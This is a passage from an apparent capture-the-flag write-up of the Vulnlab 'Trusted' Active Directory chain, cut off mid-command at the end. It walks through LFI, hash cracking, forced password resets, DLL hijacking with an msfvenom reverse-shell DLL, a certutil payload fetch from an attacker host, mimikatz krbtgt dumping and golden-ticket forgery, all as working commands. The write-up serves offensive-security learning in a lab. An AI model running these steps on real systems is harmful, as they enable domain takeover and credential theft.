<code>name</code> or <code>id</code>. This was not the case for us, as <code>db.php</code> did not have any other parameters that we can place anything into. The only result we receive from accessing <code>db.php</code> is a <code>Connection successful</code> message, however there’s pretty much nothing we can do with it.</p>\n<p><img src=\"/images/vulnlab/trusted-vl/c.jpg\"></p>\n<p>That being said, there is one webpage that does have some parameter, and it seemed to be the only parameter amongst all of the webpages I could find.<br><code>http://10.10.162.38/dev/index.html?view=contact.html</code></p>\n<p>This was the contact page from the landing website directory in <code>/dev</code>. Since we have a <code>?view</code> parameter, there’s an opportunity to exploit LFI.</p>\n<p>To those who are not aware, LFI (Local File Inclusion) is a web-application vulnerability that allows us to traverse local files on the victim’s machine through URL or website parameters. We can then dump the contents of any file we have access to straight onto the webpage.</p>\n<p>Let’s test this out on that <code>contact.html</code> page we were referring to earlier. We’ll try to access <code>C:\\Users</code> to determine if we can see the list of all users we can log onto. (Remember, this is a Windows machine, otherwise on Linux we would just dump <code>/etc/passwd</code>.)<br><code>http://10.10.162.38/dev/index.html?view=C:\\Users</code></p>\n<p><img src=\"/images/vulnlab/trusted-vl/d.jpg\"></p>\n<p>It seems that we don’t have any permissions to view it, however we did get some vital information from this error. The local path for the website seems to be <code>C:\\xampp\\htdocs\\dev</code>. In that case, let’s try to access that <code>db.php</code> page from here and view it’s contents.<br><code>http://10.10.162.38/dev/index.html?view=C:\\xampp\\htdocs\\dev\\db.php</code></p>\n<p><img src=\"/images/vulnlab/trusted-vl/e.jpg\"></p>\n<h1 id=\"SQLi-PHP-Filter-Bypass\"><a href=\"#SQLi-PHP-Filter-Bypass\" class=\"headerlink\" title=\"SQLi PHP Filter Bypass\"></a>SQLi PHP Filter Bypass</h1><p>It seems like it works! With that in mind, we can dump all the contents from this specific file by encoding it the base64 using <code>php://filter</code>. Note that we can use a <code>php://filter</code> to query database results, in this case we are querying the contents of <strong>THIS SPECIFIC FILE</strong>. It was a bit confusing for me to understand at first, however since there is a database connection occurring from this specific file we can assume that the credentials are being matched somewhere in <code>db.php</code>‘s code.</p>\n<p><code>http://10.10.162.38/dev/index.html?view=php://filter/convert.base64-encode/resource=C:/xampp/htdocs/dev/db.php</code><br>So to recap, we’re doing the following in this URL:</p>\n<ol>\n<li>Use the view parameter to start the LFI statement.</li>\n<li>Use a PHP filter to convert all contents that we dump to base64.</li>\n<li>Using the parameter <code>resource</code> to say that we want to dump all contents of <code>db.php</code> to base64.</li>\n</ol>\n<p><img src=\"/images/vulnlab/trusted-vl/f.jpg\"></p>\n<p>Looks as though the contents were dumped to the website, meaning we can decode this and see the real contents of <code>db.php</code>.<br><code>PD9waHAgDQokc2VydmVybmFtZSA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkI[...snip...]Y29ubmVjdF9lcnJvcigpKTsNCn0NCmVjaG8gIkNvbm5lY3RlZCBzdWNjZXNzZnVsbHkiOw0KPz4=</code></p>\n<p>From here, it’s just a simple base64 decode in our terminal to find out the contents.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">echo &quot;PD9waHAgDQokc2VydmVybmFtZSA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIlN1cGVyU2VjdXJlTXlTUUxQYXNzdzByZDEzMzcuIjsNCg0KJGNvbm4gPSBteXNxbGlfY29ubmVjdCgkc2VydmVybmFtZSwgJHVzZXJuYW1lLCAkcGFzc3dvcmQpOw0KDQppZiAoISRjb25uKSB7DQogIGRpZSgiQ29ubmVjdGlvbiBmYWlsZWQ6ICIgLiBteXNxbGlfY29ubmVjdF9lcnJvcigpKTsNCn0NCmVjaG8gIkNvbm5lY3RlZCBzdWNjZXNzZnVsbHkiOw0KPz4=&quot; | base64 -d</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?php </span><br><span class=\"line\">$servername = &quot;localhost&quot;;</span><br><span class=\"line\">$username = &quot;root&quot;;</span><br><span class=\"line\">$password = &quot;[...snip...]&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">$conn = mysqli_connect($servername, $username, $password);</span><br><span class=\"line\"></span><br><span class=\"line\">if (!$conn) &#123;</span><br><span class=\"line\">  die(&quot;Connection failed: &quot; . mysqli_connect_error());</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">echo &quot;Connected successfully&quot;;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"MySQL-Enumeration\"><a href=\"#MySQL-Enumeration\" class=\"headerlink\" title=\"MySQL Enumeration\"></a>MySQL Enumeration</h1><p>If you remember from earlier, our NMAP scan told us earlier that the <code>MySQL</code> service was public facing. We can attempt to authenticate to it using the credentials we have to see what else we may have access to.<br><code>mysql -h 10.10.162.38 -u &#39;root&#39; -p</code></p>\n<p>This gives us access to the <code>MariaDB</code> database, to which we can look around for any credentials to the Active Directory instance.<br>Upon some enumerating, I found some credentials in the <code>news</code> database.<br><code>select * from users;</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">+----+------------+--------------+-----------+----------------------------------+</span><br><span class=\"line\">| id | first_name | short_handle | last_name | password                         |</span><br><span class=\"line\">+----+------------+--------------+-----------+----------------------------------+</span><br><span class=\"line\">|  1 | Robert     | rsmith       | Smith     | [...snip...]                     |</span><br><span class=\"line\">|  2 | Eric       | ewalters     | Walters   | [...snip...]                     |</span><br><span class=\"line\">|  3 | Christine  | cpowers      | Powers    | [...snip...]                     |</span><br><span class=\"line\">+----+------------+--------------+-----------+----------------------------------+</span><br></pre></td></tr></table></figure>\n\n<p>Originally I had thought that these hashes were LM hashes, however upon testing them with <code>crackmapexec</code> and <code>hashcat auto-detect mode</code>, it seems that they may very well be another hashing algorithm. After a bit of testing with <code>jtr</code> it seems that this specific hashing algorithm is <code>Raw-MD5</code><br><code>john rsmith.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Using default input encoding: UTF-8</span><br><span class=\"line\">Loaded 1 password hash (Raw-MD5 [MD5 128/128 SSE2 4x3])</span><br><span class=\"line\">Warning: no OpenMP support for this hash type, consider --fork=4</span><br><span class=\"line\">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class=\"line\">[...snip...]       (?)     </span><br><span class=\"line\">1g 0:00:00:00 DONE (2024-05-02 01:41) 1.666g/s 18487Kp/s 18487Kc/s 18487KC/s IHav.One*Q..IHATESPIDERS</span><br><span class=\"line\">Use the &quot;--show --format=Raw-MD5&quot; options to display all of the cracked passwords reliably</span><br><span class=\"line\">Session completed.</span><br></pre></td></tr></table></figure>\n\n<p>This gives us the plaintext of <code>rsmith</code>‘s password, which we can use to do dump a lot of other things around this specific domain controller.</p>\n<p>Testing the creds to these with CrackMapExec, we can see that these specific creds are valid to LDAP.<br><code>crackmapexec ldap 10.10.157.166 -u &#39;rsmith&#39; -p &#39;[...snip...]&#39;</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SMB         10.10.157.166   445    LABDC            [*] Windows Server 2022 Build 20348 x64 (name:LABDC) (domain:lab.trusted.vl) (signing:True) (SMBv1:False)</span><br><span class=\"line\">LDAP        10.10.157.166   389    LABDC            [+] lab.trusted.vl\\rsmith:[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have verified that <code>rsmith</code>‘s creds are eligible to authenticate to LDAP, we can now use these same credentials to dump LDAP and identify all other domain objects.</p>\n<h1 id=\"Dumping-LDAP\"><a href=\"#Dumping-LDAP\" class=\"headerlink\" title=\"Dumping LDAP\"></a>Dumping LDAP</h1><p>Normally you’d be able to use <code>ldapdomaindump</code>, however I’m more used to using the Bloodhound-Python ingestor. I’ve also found that <code>ldapdomaindump</code> still does not work after remediating an error that you’ll see pretty soon with the Python ingestor. Nonetheless I’d still like to include what the <code>ldapdomaindump</code> command would look like in this context.<br> <code>ldapdomaindump -u LABDC\\\\&#39;rsmith&#39; -p &#39;[...snip...]&#39; ldap://10.10.157.166:389</code><br><code>BloodHound.py/bloodhound.py -d &#39;trusted.vl&#39; -u &#39;rsmith&#39; -p [...snip...] -c all -ns 10.10.157.166 --zip</code><br><a href=\"https://github.com/dirkjanm/BloodHound.py\">https://github.com/dirkjanm/BloodHound.py</a></p>\n<p>It seems I’ve encountered an issue that I’ve never come into contact before. Upon running this command, you’ll find that a nameserver error occurs based on an invalid query.<br><code>dns.resolver.NoNameservers: All nameservers failed to answer the query _ldap._tcp.pdc._msdcs.trusted.vl. IN SRV: Server Do53:10.10.157.166@53 answered SERVFAIL</code></p>\n<p>I couldn’t find why this issue occurs, however my guess is that the domain <code>trusted.vl</code> is either rerouting or denying all DNS nameserver replies that come into contact with the domain.<br>We can circumvent this issue by using <code>dnschef</code>,  a DNS proxy that will allow us to bind all DNS requests back to localhost instead of making a direct request to the DNS server.</p>\n<p>Note that you’ll need two terminals to do this, one for initializing the DNS proxy and another for actually utilizing the ingestor.<br><code>dnschef --fakeip 10.10.157.166</code><br><code>BloodHound.py/bloodhound.py -d &#39;lab.trusted.vl&#39; -u &#39;rsmith&#39; -p &#39;[...snip...]&#39; -c all -ns 127.0.0.1 --zip -dc labdc.lab.trusted.vl</code></p>\n<p>This is a potential workaround when coming into contact with DNS nameserver resolution errors when coming into contact with errors using the ingestor. While this may not work every time, it is still a method to give a shot.</p>\n<p>After receiving the compressed domain dump file, we can import it to Bloodhound and begin enumerating what <code>rsmith</code> can do.</p>\n<p>In case you are unfamiliar with how to set up Bloodhound, here’s a beginner walkthrough to do before the next step in this walkthrough. <a href=\"https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux\">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux</a></p>\n<p>After uploading the zip folder to Bloodhound, let’s search up the domain object for <code>rsmith@lab.trusted.vl</code>. After selecting <code>Node Info</code>, we can see that <code>rsmith</code> has an1 outbound object control.</p>\n<p><img src=\"/images/vulnlab/trusted-vl/g.jpg\"></p>\n<p>It seems that <code>rsmith</code> has <code>ForceChangePassword</code> rights onto <code>ewalters</code>, one of the other users that we dumped in our enumeration of the SQL instance previously. This outbound object control means exactly what you think it might mean - <code>rsmith</code> has the ability to force a password reset on <code>ewalters</code>, meaning we can do exactly that.</p>\n<h1 id=\"ForceChangePassword-Object-Control\"><a href=\"#ForceChangePassword-Object-Control\" class=\"headerlink\" title=\"ForceChangePassword Object Control\"></a>ForceChangePassword Object Control</h1><p>To reset a user’s password with this outbound object control, you can use tools such as <code>rpcclient</code> or <code>bloodyad</code>. I’m more used to using <code>bloodyad</code> so that’s what we’ll use in our situation. <code>bloodyAD/bloodyAD.py -u &#39;rsmith&#39; -p &#39;[...snip...]&#39; -d &#39;lab.trusted.vl&#39; --host 10.10.157.166 set password &#39;ewalters&#39; &#39;password123@&#39;</code></p>\n<p>I changed <code>ewalters</code> password to something simple, however you can make it whatever you’d like. If successful, you’ll receive a small <code>[+] Password has changed successfully!</code> message. This indicates that the password for <code>ewalters</code> has been changed amongst the entire domain.</p>\n<p>We can now verify that the changes have been made with CrackMapExec. I’ve decided to use a one-liner with all of the CME services separated by a newline in a text file.<br><code>for line in $(cat cme_services.txt); do crackmapexec $line 10.10.157.166 -u &#39;ewalters&#39; -p &#39;password123@&#39;; done</code></p>\n<p>You’ll notice that while RDP is valid (despite Bloodhound telling us that this user has RDP privileges, we can authenticate to WinRM.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SMB         10.10.157.166   5985   LABDC            [*] Windows Server 2022 Build 20348 (name:LABDC) (domain:lab.trusted.vl)</span><br><span class=\"line\">HTTP        10.10.157.166   5985   LABDC            [*] http://10.10.157.166:5985/wsman</span><br><span class=\"line\">WINRM       10.10.157.166   5985   LABDC            [+] lab.trusted.vl\\ewalters:password123@ (Pwn3d!)</span><br></pre></td></tr></table></figure>\n\n<p>So from here we’ll use <code>evil-winrm</code> to authenticate through WinRM with the <code>ewalters</code> user.</p>\n<p><code>evil-winrm --ip 10.10.157.166 -u &#39;ewalters&#39; -p &#39;password123@&#39;</code></p>\n<p><img src=\"/images/vulnlab/trusted-vl/h.jpg\"></p>\n<h1 id=\"DC1-Host-Reconnaissance\"><a href=\"#DC1-Host-Reconnaissance\" class=\"headerlink\" title=\"DC1 Host Reconnaissance\"></a>DC1 Host Reconnaissance</h1><p>While normally we’d get the user flag at this point, <code>r0BIT</code> messed around with us and left a fake flag in <code>ewalters</code> Desktop directory.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">*Evil-WinRM* PS C:\\Users\\ewalters\\Documents&gt; cd ../Desktop</span><br><span class=\"line\">*Evil-WinRM* PS C:\\Users\\ewalters\\Desktop&gt; ls</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    Directory: C:\\Users\\ewalters\\Desktop</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Mode                 LastWriteTime         Length Name</span><br><span class=\"line\">----                 -------------         ------ ----</span><br><span class=\"line\">-a----         6/21/2016   3:36 PM            527 EC2 Feedback.website</span><br><span class=\"line\">-a----         6/21/2016   3:36 PM            554 EC2 Microsoft Windows Guide.website</span><br><span class=\"line\">-a----         9/18/2022   9:12 PM         202492 robitcat.jpg</span><br><span class=\"line\">-a----         9/18/2022   9:11 PM            108 User.txt</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">c*Evil-WinRM* PS C:\\Users\\ewalters\\Desktop&gt; cat User.txt</span><br><span class=\"line\">|\\---/|</span><br><span class=\"line\">| o_o |</span><br><span class=\"line\"> \\_^_/</span><br><span class=\"line\">These are not the flags you&#x27;re looking for.</span><br><span class=\"line\">Take :robitcat: as compensation :).</span><br></pre></td></tr></table></figure>\n\n<p>It looks like we’ll need to look around a little more and escalate to another user to get the user flag. My guess is that we’ll need to get to <code>cpowers</code>, who was the third and final user that we were able dumped from the SQL database.</p>\n<p>While I was looking around the filesystem for any leads, I stumbled across a folder in the <code>C:\\</code> directory titled, <code>AVTest</code>. This isn’t a folder that’s here regularly so let’s take a look into it a little more.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">*Evil-WinRM* PS C:\\AVTest&gt; ls</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    Directory: C:\\AVTest</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Mode                 LastWriteTime         Length Name</span><br><span class=\"line\">----                 -------------         ------ ----</span><br><span class=\"line\">-a----         9/14/2022   4:46 PM        4870584 KasperskyRemovalTool.exe</span><br><span class=\"line\">-a----         9/14/2022   7:05 PM            235 readme.txt</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">*Evil-WinRM* PS C:\\AVTest&gt; cat readme.txt</span><br><span class=\"line\">Since none of the AV Tools we tried here in the lab satisfied our needs it&#x27;s time to clean them up.</span><br><span class=\"line\">I asked Christine to run them a few times, just to be sure.</span><br><span class=\"line\"></span><br><span class=\"line\">Let&#x27;s just hope we don&#x27;t have to set this lab up again because of this.</span><br></pre></td></tr></table></figure>\n\n<p>The <code>readme.txt</code> tells us that the AV tools are being disposed of, however it seems that the <code>cpowers</code> user will be running this executable a few more times before the dispose is initiated.</p>\n<p>In a regular red-teaming context, we need to ensure that we move hastily upon seeing this. We may not know the timeframe when the <code>cpowers</code> user is going to execute values.<br>At the same time, this is a pen-testing lab, so I’m going to assume that there’s a scheduled task running every now and then that will execute the file - just my logical thinking though.</p>\n<p>Not only that, but if we take a look at <code>cpowers</code> in Bloodhound, we can see that they’re part of the Domain Admins group for this domain.</p>\n<p><img src=\"/images/vulnlab/trusted-vl/i.jpg\"></p>\n<p>This means that if we compromise <code>cpowers</code>, we’ll have full control over this domain controller.</p>\n<p>Let’s examine this file to see if there’s anything we can do to escalate our privileges when <code>cpowers</code> runs it. Normally I’d just transfer it using a C2 or by using a simple Python server on the Windows machine, however it seems I was unable to find success when trying either of them. Instead we can stand up our own SMB server using Impacket’s <code>smbserver</code> utility.</p>\n<p>Kali - <code>impacket-smbserver smb share/ -smb2support</code><br>WinRM - <code>copy KasperskyRemovalTool.exe \\\\10.8.0.173\\smb\\KasperskyRemovalTool.exe</code></p>\n<p>This should download the AV tool into our <code>share/</code> directory (that we might need to create locally before setting up the SMB server).</p>\n<p>So this next part was where I got confused, as examining this with tools such as Ghidra didn’t result in many finds. Usually when it comes to reverse engineering PE32 binaries, you’d want to look specifically at abnormal classes or functions or even DLLs that the binary uses that could be exploited. The only issue is that all of these binary functions for this file seem to be relatively normal or at least don’t seem to be noteworthy enough to look into.</p>\n<p>Looking into CVE’s didn’t seem to get me anywhere either, but it started to get a few gears working as to what we could potentially do. <a href=\"https://www.exploit-db.com/exploits/10484\">https://www.exploit-db.com/exploits/10484</a><br>While we know that the starting functions don’t seem to be very important, what about the DLLs that are loaded while the file is running? Could these potentially be exploited?</p>\n<p>I decided to use ProcMon for this, as we can look specifically at the DLLs that are being ran after we execute the file and while it is running.<br>Note that I was running my machine through a Kali Linux VM, so I’ll need to transfer it to my local Windows 10 host in order to examine it with ProcMon.</p>\n<h1 id=\"ProcMon-Executable-Reverse-Engineering\"><a href=\"#ProcMon-Executable-Reverse-Engineering\" class=\"headerlink\" title=\"ProcMon Executable Reverse Engineering\"></a>ProcMon Executable Reverse Engineering</h1><p>There are alternatives to setting up ProcMon for Linux, however I was unable to get it working when I had tried it out initially. I’ll still leave the link for it as provided here: <a href=\"https://github.com/Sysinternals/ProcMon-for-Linux?tab=readme-ov-file\">https://github.com/Sysinternals/ProcMon-for-Linux?tab=readme-ov-file</a></p>\n<p><img src=\"/images/vulnlab/trusted-vl/j.jpg\"></p>\n<p>Before we run the file, we should make sure that we have the right filters set up since we’ll get barraged with internal functions and files that the binary will use during runtime. Go to <code>Filter &gt; Filter</code> (or just press <code>Ctrl + l</code></p>\n<p>On this screen, we can create filters to view only a section of processes and&#x2F;or functions that interest us.</p>\n<p><img src=\"/images/vulnlab/trusted-vl/k.jpg\"></p>\n<p>For simplicities sake, I’ve outlined the filter parameters that we’ll need to detect the processes of interest.</p>\n<p><code>Process Name - contains - Kaspersky -&gt; then Include</code><br><code>Path - ends with - .dll -&gt; then Include</code></p>\n<p>Running the file with these two filters still leaves us with a barrage of information, however you’ll notice that many of the DLLs have a <code>Result</code> value of <code>NAME NOT FOUND</code>. This is particularly interesting, as the <code>File Path</code> for the DLL is within the same directory of the binary that was executed.</p>\n<p>We’ll also put down these results as another filter to see specifically what DLLs these results entail.</p>\n<p><code>Result - is - NAME NOT FOUND -&gt; then Include</code></p>\n<p><img src=\"/images/vulnlab/trusted-vl/l.jpg\"></p>\n<p>There are a numerous amount of DLLs that are executed within the same directory as the binary (my binary is located in <code>Downloads\\kas\\</code>). This presents us with a vulnerability that is also new for my research - DLL Hijacking.</p>\n<h1 id=\"DLL-Hijacking\"><a href=\"#DLL-Hijacking\" class=\"headerlink\" title=\"DLL Hijacking\"></a>DLL Hijacking</h1><p>DLL Hijacking is a Windows application vulnerability that essentially allows an attacker to load malicious DLLs into a process in place of regular DLLs. This can occur in the situation in front of us - when a binary uses DLLs that are located within a modifiable directory that we have access to. By replacing a normal DLL that is used, we can trick the Windows API into running our malicious DLL.</p>\n<p>I plan on making a research post about DLL Hijacking in the future, however in the meantime I’ve referenced a HackTricks post that illustrates it relatively well.<br><a href=\"https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking\">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking</a></p>\n<p>So in that case let’s give it a try. We’ll start by creating a malicious DLL with <code>msfvenom</code>, which can be done using the following command. I initially tried this with replacing <code>USP10.dll</code>, however I found that it wouldn’t spawn a reverse shell as intended. Instead, we’ll use the <code>KasperskyRemovalToolENU.dll</code> that is called multiple times during runtime.<br><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.8.0.173 LPORT=9001 -f dll &gt; KasperskyRemovalToolENU.dll</code></p>\n<p>We’ll then set up a Python web server with <code>python3 -m http.server 9002</code> to transfer the file.<br>Also, we’ll set up a netcat reverse shell so that when <code>cpowers</code> executes the Kaspersky tool binary, we’ll get a callback after our malicious DLL is ran.</p>\n<p>On Kali - <code>nc -lvnp 9001</code><br>On WinRM - <code>certutil.exe -urlcache -f http://10.8.0.173:9002/KasperskyRemovalToolENU.dll KasperskyRemovalToolENU.dll</code></p>\n<p>After a few seconds of waiting, our netcat listener should spawn a reverse shell as <code>cpowers</code>.</p>\n<p><img src=\"/images/vulnlab/trusted-vl/m.jpg\"></p>\n<p>Since we are now a DA, we can read the user flag that is present in the <code>Administrator</code> directory.</p>\n<p><code>PS C:\\Windows\\system32&gt; cd C:\\Users\\Administrator\\Desktop; cat User.txt</code></p>\n<p>From here, I stood up a Sliver C2 server to try and enumerate the other domain a little easier.</p>\n<p>Note that we couldn’t do this previously as <code>ewalters</code>, as there was a GPO that restricted us from doing so.<br>If you’re unaware on how to set up a Sliver C2 server, I’ll reference the material needed to do so here: <a href=\"https://github.com/BishopFox/sliver\">https://github.com/BishopFox/sliver</a><br><code>sliver &gt; mtls</code><br><code>generate beacon --mtls 10.8.0.173 --os windows --format exe --arch amd64 --skip-symbols --save (directory of your choice)</code></p>\n<p>After transferring the file and running it on our reverse shell, we should see a session spawn on Sliver.</p>\n<p><img src=\"/images/vulnlab/trusted-vl/n.jpg\"></p>\n<p>So to start, my first guess is that there’s some form of domain trust amongst both domain controllers. I had said this earlier in the machine, just based off the chain’s name <code>Trusted</code>. There’s two (technically three) methods that I know of to enumerate a domain, consisting across all of the shells we have access to.</p>\n<h1 id=\"Domain-Trust-Enumeration\"><a href=\"#Domain-Trust-Enumeration\" class=\"headerlink\" title=\"Domain Trust Enumeration\"></a>Domain Trust Enumeration</h1><p>We can enumerate the domain locally with <code>Get-ADTrust</code>, a regular PowerShell module that is present on this machine.<br><code>Get-ADTrust -Filter *</code></p>\n<p>Another is to drop <code>PowerView</code> to the machine and then import it.<br><a href=\"https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1\">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</a><br><code>Import-Module .\\PowerView.ps1; Get-DomainTrust</code></p>\n<p>Finally, we can also use <code>sharpview</code>, a .NET version of <code>PowerView</code> that is present in Sliver’s <code>armory</code> function.<br><code>sliver &gt; armory install sharpview</code><br><code>sliver &gt; sharpview Get-Domain</code><br>The only issue with <code>sharpview</code> is that I was running into an LDAP issue (when running <code>Get-DomainTrust</code>, so I’ll just use the local <code>PowerView</code> option we discussed about previously.</p>\n<p>After running <code>Get-DomainTrust</code> or <code>Get-ADTrust</code>, we receive the following output.</p>\n<p><img src=\"/images/vulnlab/trusted-vl/o.jpg\"></p>\n<p>This means that there is a <code>Bidirectional</code> domain trust between both the child domain <code>lab.trusted.vl</code> and the parent domain <code>trusted.vl</code>. What this essentially means is that both domains <code>lab.trusted.vl</code> and <code>trusted.vl</code> trust one another - meaning that if you are a Domain Admin in one of the domains, you can also create a TGT for a Domain Admin in the other.</p>\n<p>I’d like to create a blog post about this in the future, as the term for this is called <code>Domain Dominance</code> and is relatively interesting how you can compromise domains through domain trusts. You can also verify this in <code>Bloodhound</code> by looking at the <code>Map Domain Trusts</code> in the <code>Analysis</code> tab.</p>\n<p><img src=\"/images/vulnlab/trusted-vl/p.jpg\"></p>\n<p>This also means that we can create a Golden ticket through Kerberos that can be used across both domains. For context, a Golden ticket is a forged TGT, which is signed by the respective domain’s <code>krbtgt</code> service account. This ticket can be used to impersonate any user, on any service, to every machine on the domain (or within the domain trust!). What also makes this incredibly powerful is that the credentials are never changed automatically. This means that if you have the <code>krbtgt</code> AES or NTLM hash, you can essentially perform almost any domain attack that you’d like (such as <code>dcsync</code> as an example).</p>\n<p>In order to exploit the domain trust, we’ll need three different things: </p>\n<ul>\n<li>The <code>NTLM</code> of the <code>krbtgt</code> domain object.</li>\n<li>The <code>LAB</code> domain object SID.</li>\n<li>The <code>TRUSTED</code> domain object SID for the <code>Enterprise Admins</code> group.</li>\n</ul>\n<p>In order to get all three of those, we can use <code>mimikatz</code> to dump all of this information. Generally we’d want to try and get <code>mimikatz</code> past AV by utilizing a C2 or by process injection, however we won’t need to do this since Defender is not enabled for this chain.</p>\n<h1 id=\"Golden-Ticket-to-DC2\"><a href=\"#Golden-Ticket-to-DC2\" class=\"headerlink\" title=\"Golden Ticket to DC2\"></a>Golden Ticket to DC2</h1><p>Thus, we can just drop <code>mimikatz</code> to disk and run it through the DC. <a href=\"https://github.com/ParrotSec/mimikatz\">https://github.com/ParrotSec/mimikatz</a></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sliver &gt; upload mimikatz.exe</span><br><span class=\"line\"></span><br><span class=\"line\">C:\\Users\\cpowers\\Documents&gt; .\\mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::lsa /user:krbtgt /patch&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>\n\n<p>This gives us the <code>krbtgt</code> NTLM hash as well as the <code>LAB</code> domain SID.<br>In order to get the domain SID of the <code>TRUSTED</code> domain, we can use a built-in PowerShell cmdlet call <code>Get-ADGroup</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Users\\cpowers\\Documents&gt; Get-ADGroup -Filter &#123;name -eq &quot;Enterprise Admins&quot;&#125; -Server trusted.vl</span><br></pre></td></tr></table></figure>\n\n<p>Try not to do this through <code>Evil-WinRM</code>, I ran into some domain resolution issues and instead found better luck by running it through a reverse shell.<br>We now have the following information in order to build our Golden ticket.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">NTLM Hash     - [...snip...]</span><br><span class=\"line\">LAB SID       - S-1-5-21-2241985869-2159962460-1278545866</span><br><span class=\"line\">TRUSTED SID   - S-1-5-21-3576695518-347000760-3731839591-519</span><br><span class=\"line\">Target Domain - trusted.vl</span><br><span class=\"line\"></span><br><span class=\"line\">&gt; impacket-ticketer -nthash [...snip...] -domain-sid S-1-5-21-2241985869-2159962460-1278545866 -extra-sid S-1-5-21-3576695518-347000760-3731839591-519 -domain lab.trusted.vl Administrator</span><br></pre></td></tr></table></figure>\n\n<p>This saves our Golden ticket as a new file called <code>Administrator.ccache</code>. We’ll need to set this as a global variable on our Kali machine to use this to authenticate with Kerberos on the parent domain.</p>\n<p>Once all of this is completed, we can use <code>psexec</code> to spawn a shell in this domain as the <code>Administrator</code> user. Reminder to use the <code>FQDN</code> (Fully Qualified Domain Name) of the parent domain controller, which is <code>trusteddc.trusted.vl</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt; export KRB5CCNAME=Administrator.ccache</span><br><span class=\"line\"></span><br><span class=\"line\">&gt; impacket-psexec lab.trusted.vl/Administrator@trusteddc.trusted.vl -k -no-pass -target-ip 10.10.197.213</span><br></pre></td></tr></table></figure>\n\n<p>This will open up a remote shell through <code>PsExec</code> on the <code>TRUSTEDDC</code> domain controller a <code>SYSTEM</code>, meaning we have completed this chain! Is what I hoped.</p>\n<p><img src=\"/images/vulnlab/trusted-vl/q.jpg\"></p>\n<p>You’ll notice that if you try to read the <code>root.txt</code>, we don’t have the permissions to read it. Which if we think about it, doesn’t make sense right? We’re <code>SYSTEM</code> yet we don’t have permissions to read the file.</p>\n<p>My guess is that there are privileges that restricting us from accessing this file, meaning we need to use . To save some time (in the screenshot above as you’ll notice), I used <code>mimikatz</code> to dump the Administrator hash and log-in with it through WinRM, however this STILL did not let us access the file.</p>\n<p><code>C:\\Users\\Administrator\\Desktop&gt; .\\mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::lsa /user:Administrator /patch&quot; &quot;exit&quot; </code>evil-winrm –ip 10.10.197.213 -u ‘Administrator’ -H ‘[…snip…]’&#96; (with Administrator NTLM hash)</p>\n<p>If you run <code>cipher /u /n</code> on the machine, you’ll notice that the <code>root</code> flag is encrypted with <code>EFS</code>.</p>\n<p><img src=\"/images/vulnlab/trusted-vl/r.jpg\"></p>\n<h1 id=\"EFS-Bypass-as-SYSTEM\"><a href=\"#EFS-Bypass-as-SYSTEM\" class=\"headerlink\" title=\"EFS Bypass as SYSTEM\"></a>EFS Bypass as SYSTEM</h1><p>EFS (Encrypted File System) is a built-in Windows encryption feature that allows you to encrypt files or directories to prevent other users from opening them. This produces a certificate, which is required to be present in your current session in order to decrypt the encrypted file and read it.</p>\n<p>I also plan on creating a blog post based on <code>EFS</code> file decryption, as there’s other bypasses aside from the one you’ll see in a few moments.</p>\n<p>To bypass this, we can use <code>runasCs</code> to circumvent the <code>EFS</code> encryption and read the flag as we  would normally.<br>We’ll also need to change the <code>Administrator</code>‘s user password in order to use <code>runasCs</code>, which is really simple now that we have access to command-line session as this user.</p>\n<p><code>net user administrator &quot;password123@&quot;</code><br><a href=\"https://github.com/antonioCoco/RunasCs\">https://github.com/antonioCoco/RunasCs</a></p>\n<p>Note that you can just use the PowerShell module that comes in this GitHub package, and just import it. Make sure to also upload this in a directory other than the <code>Administrator</code> directory, as this entire directory under the <code>EFS</code> encryption rule.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sliver &gt; upload 